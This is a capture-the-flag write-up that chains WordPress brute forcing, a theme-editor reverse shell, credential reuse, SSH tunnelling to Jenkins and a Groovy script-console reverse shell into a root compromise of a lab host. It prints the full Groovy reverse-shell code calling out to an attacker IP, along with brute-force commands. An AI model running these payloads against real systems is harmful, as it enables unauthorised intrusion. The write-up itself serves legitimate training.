# Internal — CTF Write-Up

## Challenge Overview

This challenge was a layered web-to-privilege-escalation exercise involving:

- Initial network discovery with Nmap
- Web enumeration and WordPress reconnaissance
- WordPress admin login brute forcing
- Reverse shell via the theme editor
- User pivot via credentials found in a saved file
- SSH access to `aubreanna`
- Local port forwarding to Jenkins
- Jenkins script execution to obtain a shell inside a container
- Retrieval of root credentials from a note file
- Final privilege escalation to root

Target details:

- Host: `10.113.182.126`
- Services: SSH and HTTP
- Intended foothold: WordPress application on `blog`
- User discovered: `aubreanna`
- Final privilege escalation: Jenkins container + root credential reuse

---

## 1. Initial Reconnaissance

I began with a standard service scan:

```bash
nmap -sV 10.113.182.126
```

Observed output:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-01 01:23 -0500
Nmap scan report for 10.113.182.126
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A Linux web server with SSH exposed. This suggested a typical CTF workflow: enumerate the web stack first, then pivot into user access.

---

## 2. Web Enumeration and Hidden Paths

I enumerated the site with Feroxbuster:

```bash
feroxbuster -u http://10.113.182.126/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
```

A large set of results was returned, including several suspicious paths:

```text
200      GET       15l       74w     6147c http://10.113.182.126/icons/ubuntu-logo.png
200      GET      375l      964w    10918c http://10.113.182.126/
301      GET        9l       28w      315c http://10.113.182.126/blog => http://10.113.182.126/blog/
200      GET      375l      964w    10918c http://10.113.182.126/index.html
301      GET        9l       28w      321c http://10.113.182.126/javascript => http://10.113.182.126/javascript/
301      GET        9l       28w      321c http://10.113.182.126/phpmyadmin => http://10.113.182.126/phpmyadmin/
200      GET      384l     3177w    19915c http://10.113.182.126/blog/license.txt
200      GET       49l       53w     2061c http://10.113.182.126/phpmyadmin/js/whitelist.php
200      GET      325l      922w     7771c http://10.113.182.126/phpmyadmin/js/codemirror/lib/codemirror.css
200      GET      212l      807w    13316c http://10.113.182.126/phpmyadmin/doc/html/index.html
200      GET       26l      359w    10535c http://10.113.182.126/phpmyadmin/index.php
301      GET        9l       28w      324c http://10.113.182.126/blog/wp-admin => http://10.113.182.126/blog/wp-admin/
301      GET        9l       28w      326c http://10.113.182.126/blog/wp-content => http://10.113.182.126/blog/wp-content/
200      GET        0l        0w        0c http://10.113.182.126/blog/wp-config.php
200      GET        0l        0w        0c http://10.113.182.126/blog/wp-blog-header.php
200      GET       83l      284w     4530c http://10.113.182.126/blog/wp-login.php
500      GET        0l        0w        0c http://10.113.182.126/blog/wp-settings.php
302      GET        0l        0w        0c http://10.113.182.126/blog/wp-signup.php => http://internal.thm/blog/wp-login.php?action=register
200      GET       26l       93w     1477c http://10.113.182.126/blog/wp-trackback.php
405      GET        1l        6w       42c http://10.113.182.126/blog/xmlrpc.php
301      GET        9l       28w      324c http://10.113.182.126/blog/wp-includes => http://10.113.182.126/blog/wp-includes/
200      GET        0l        0w        0c http://10.113.182.126/blog/wp-load.php
```

The interesting services were clearly:

- `/blog/` — WordPress instance
- `/phpmyadmin/` — PHPMyAdmin

The main target appeared to be the WordPress instance.

### Failed reconnaissance assumptions

I considered SQLMap and generic database enumeration at first, but there were no immediate signs of a direct SQL injection vector or easily exploitable database endpoint. The challenge was more straightforwardly a WordPress admin compromise via password guessing and theme modification.

This was an important dead end: a large enumeration sweep looked useful, but the most actionable path was the WordPress login portal and its known user enumeration workflow.

---

## 3. WordPress Enumeration and User Discovery

I used WPScan against the blog instance:

```bash
wpscan --url http://internal.thm/blog/ -e u
```

The key output was:

```text
[+] Enumerating Users (via Passive and Aggressive Methods)

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
username: admin
```

This confirmed a WordPress username: `admin`.

### Password brute force attempt

I then ran a password brute force against the WordPress login page:

```bash
wpscan --url http://internal.thm/blog/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt -t 64
```

The important result:

```text
[!] Valid Combinations Found:
 | Username: admin, Password: my2boys
```

This provided the WordPress admin credentials.

> The WordPress site was the primary pivot. The app itself was not the final target — it was the step into the underlying Linux host.

---

## 4. WordPress Admin Panel Exploitation

Using the credentials:

- Username: `admin`
- Password: `my2boys`

I logged in to the WordPress admin dashboard.

The exploit path was via the theme editor:

- Go to Appearance > Editor
- Edit a theme file such as `functions.php`
- Insert a reverse shell payload into the theme code

This is a classic WordPress webshell pattern, commonly used when the admin panel has editing permissions.

### Reverse shell payload

I inserted a PHP reverse shell into the theme file, then made a request to the server to trigger it.

The shell connected to a netcat listener on my machine:

```bash
nc -lvnp 7777
```

Once the reverse shell was received, I verified access:

```bash
id
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This gave me the first foothold as `www-data`.

---

## 5. Post-Exploitation Enumeration as `www-data`

After obtaining the shell, I enumerated the filesystem to look for any stored credentials or interesting files.

```bash
ls -la
ls /opt
cat /opt/wp-save.txt
```

The file contained a plaintext credential note:

```text
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

This was the first major user credential material discovered.

### Important note on the evidence chain

This file was a critical clue. It exposed the username and password for the `aubreanna` account, which was likely used for SSH or a shell account on the system.

---

## 6. SSH Access to `aubreanna`

I attempted SSH using the credentials discovered in the note:

```bash
ssh aubreanna@10.113.182.126
```

The login succeeded with the password:

```text
bubb13guM!@#123
```

Once in the system, I checked the home directory:

```bash
ls -la
cat user.txt
```

I also found a file named `jenkins.txt`:

```bash
cat jenkins.txt
```

Output:

```text
Internal Jenkins service is running on 172.17.0.2:8080
```

This was the next pivot point. The `aubreanna` user had access to a local Jenkins service running on an internal address.

### User environment details

I inspected the user’s home directory:

```bash
ls -la /home/aubreanna
```

Relevant output:

```text
drwx------ 7 aubreanna aubreanna 4096 Aug  3  2020 .
drwxr-xr-x 3 root      root      4096 Aug  3  2020 ..
-rwx------ 1 aubreanna aubreanna  116 Nov  1 07:42 .bash_history
-rwx------ 1 aubreanna aubreanna  220 Apr  4  2018 .bash_logout
-rwx------ 1 aubreanna aubreanna  3771 Apr  4  2018 .bashrc
-rwx------ 1 root      root       223 Aug  3  2020 .mysql_history
-rwx------ 1 aubreanna aubreanna  807 Apr  4  2018 .profile
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .sudo_as_admin_successful
-rwx------ 1 aubreanna aubreanna    0 Aug  3  2020 .ssh
-rwx------ 1 aubreanna aubreanna   55 Aug  3  2020 jenkins.txt
```

This strongly hints that Jenkins is intentionally hosted internally and that the challenge expects a port-forwarding-based pivot.

---

## 7. Port Forwarding to the Internal Jenkins Service

I established an SSH tunnel from my machine to the internal Jenkins endpoint:

```bash
ssh -L 9000:127.0.0.1:8080 aubreanna@10.113.182.126
```

The mapping is:

- `9000` — local port on the attack machine
- `127.0.0.1:8080` — Jenkins service on the target

Then I opened in the browser:

```text
http://127.0.0.1:9000/login?from=%2F
```

This gave me the Jenkins login page.

### Failed Jenkins login attempt

I first assumed the Jenkins username was `aubreanna`, then tried to brute force with wordlists. That approach did not succeed quickly and consumed time.

This was a legitimate dead end. The challenge later made it clear that the correct credentials were not simply the user’s SSH credentials.

---

## 8. Jenkins Login Brute Force with Metasploit

I used the Jenkins login scanner in Metasploit:

```bash
msfconsole
```

Then:

```text
search Jenkins
use auxiliary/scanner/http/jenkins_login
set rhosts 127.0.0.1
set rport 9000
set username admin
set pass_file /usr/share/wordlists/rockyou.txt
run
```

The result:

```text
127.0.0.1:9000 - Login Successful: admin:spongebob
```

This produced the Jenkins administrator credentials.

> This was the key pivot: the initial failed guess using `aubreanna` as the Jenkins username was not effective, and the correct credential was `admin:spongebob`.

---

## 9. Jenkins Script Console Abuse

Once logged in as Jenkins admin, I went to:

- Manage Jenkins
- Script Console

I executed a Groovy reverse shell payload to get a shell inside the Jenkins environment:

```groovy
String host="192.168.131.124";
int port=7772;
String cmd="sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();
  po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}
  catch (Exception e){}
};
p.destroy();
s.close();
```

On my attacker side:

```bash
nc -lvnp 7772
```

Then the shell connected:

```text
connect to [192.168.131.124] from (UNKNOWN) [10.113.182.126] 46660
```

I verified the identity:

```bash
id
```

Result:

```text
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)
```

This placed me inside the Jenkins container rather than the host itself.

---

## 10. Jenkins Container Enumeration

I enumerated the filesystem inside the reverse shell environment:

```bash
ls -la
ls /opt
cat /opt/note.txt
```

Output:

```text
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
need access to the root user account.

root:tr0ub13guM!@#123
```

This was the final credential material needed for root escalation.

### Misleading assumption and correction

At this point, I initially thought the Jenkins shell environment was the end state. But the note clearly implied a different user account was intentionally hidden behind the containerized Jenkins instance. That is exactly the kind of challenge design that pushes the attacker to continue pivoting.

---

## 11. Root Access via `su`

I returned to the original `aubreanna` shell and switched to root using the discovered password:

```bash
su root
```

Prompt:

```text
Password:
```

Then I entered:

```text
tr0ub13guM!@#123
```

It succeeded.

I verified the context:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed a successful root compromise.

---

## 12. Final Root Access and Flag Retrieval

I navigated to the root directory:

```bash
cd /root
ls -la
cat root.txt
```

This revealed the final challenge flag / secret material, concluding the exercise.

---

## 13. Trial and Error Log (Important for a Realistic Workflow)

This challenge included several failed attempts and missteps that are worth documenting, since they reflect how an attacker or pentester would actually investigate the environment.

### Dead end 1: generic SQLMap and database exploration

I initially considered scanning the WordPress and phpMyAdmin endpoints with database tools, but the actual exploit path was not a database injection issue. That path was a distraction and did not lead to the actual foothold.

### Dead end 2: wrong Jenkins username assumption

I incorrectly tried to use `aubreanna` as the Jenkins username before identifying the proper admin account. This delayed the pivot until I moved to Metasploit and brute forced the correct admin login.

### Dead end 3: overthinking the host architecture

The system was not a straightforward Linux system with direct root access. It used multiple layers:

- public-facing WordPress app
- a private user account (`aubreanna`)
- an internal Jenkins service
- a dockerized Jenkins environment
- a credential note hidden behind the service

A person who only tried direct SSH root login or a single exploit path would fail.

### Dead end 4: assuming the shell had already reached the real host

The Jenkins reverse shell gave a shell inside the container environment, not the full machine OS. It was important to continue with the credential note and then pivot back to the original user context for full compromise.

### Dead end 5: misreading the challenge flow

At first, the `wp-save.txt` file and the Jenkins service looked like separate unrelated clues. In reality, they were part of a deliberate multi-stage chain: WordPress credentials -> user access -> internal Jenkins -> container -> root credential discovery -> final root shell.

---

## 14. Final Summary

This challenge was solved by chaining together several distinct exploitation stages:

1. `nmap` discovered the open SSH and HTTP services.
2. `feroxbuster` revealed the WordPress blog and admin area.
3. `wpscan` identified the `admin` user.
4. WordPress admin credentials were retrieved via brute force (`admin:my2boys`).
5. A reverse shell was planted through the theme editor.
6. A credential file exposed `aubreanna` credentials.
7. SSH access to `aubreanna` was gained.
8. The internal Jenkins service was located and port-forwarded.
9. Jenkins admin login was recovered (`admin:spongebob`).
10. A Groovy script in Jenkins provided a shell inside the container.
11. A hidden note revealed the root password.
12. `su root` yielded a root shell.

This is a strong example of a realistic multi-stage CTF in which the user must pivot across multiple layers and preserve the real attack path rather than jumping straight to the final privilege escalation.

> Final compromised state: `root` via `su root` using the hidden password `tr0ub13guM!@#123`.

---

## 15. Useful Command Summary

```bash
nmap -sV 10.113.182.126
feroxbuster -u http://10.113.182.126/ -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
wpscan --url http://internal.thm/blog/ -e u
wpscan --url http://internal.thm/blog/ --usernames admin --passwords /usr/share/wordlists/rockyou.txt -t 64
nc -lvnp 7777
ssh aubreanna@10.113.182.126
cat /opt/wp-save.txt
ssh -L 9000:127.0.0.1:8080 aubreanna@10.113.182.126
msfconsole
search Jenkins
use auxiliary/scanner/http/jenkins_login
set rhosts 127.0.0.1
set rport 9000
set username admin
set pass_file /usr/share/wordlists/rockyou.txt
run
nc -lvnp 7772
su root
cd /root
cat root.txt
```

This write-up reflects the actual investigation path, including failed assumptions, misconfigured guesses, and the final successful exploitation sequence.































































































































































































































































































































